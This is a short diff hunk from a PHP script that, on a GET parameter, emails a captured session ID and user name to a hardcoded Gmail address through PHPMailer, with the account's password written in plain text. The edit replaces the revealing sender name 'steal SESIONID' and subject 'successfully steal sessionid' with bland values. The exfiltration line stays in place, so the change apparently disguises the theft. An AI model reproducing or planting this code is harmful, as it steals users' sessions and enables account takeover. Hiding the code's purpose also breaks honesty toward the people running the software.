@@ -27,9 +27,9 @@ if (isset($_GET["abc"])) {
 
     $mail->Username = 'ahbcgd590@gmail.com';
     $mail->Password = '102102102';
-    $mail->SetFrom('ahbcgd590@gmail.com', "steal SESIONID");
+    $mail->SetFrom('ahbcgd590@gmail.com', "me");
     $mail->AddReplyTo('ahbcgd590@gmail.com', 'Admin');
-    $mail->Subject = 'successfully steal sessionid';
+    $mail->Subject = '';
     $mail->MsgHTML("sessionid : ".$sessionid." user : ".$user);
     $mail->AddAddress('ahbcgd590@gmail.com', 'me');
     
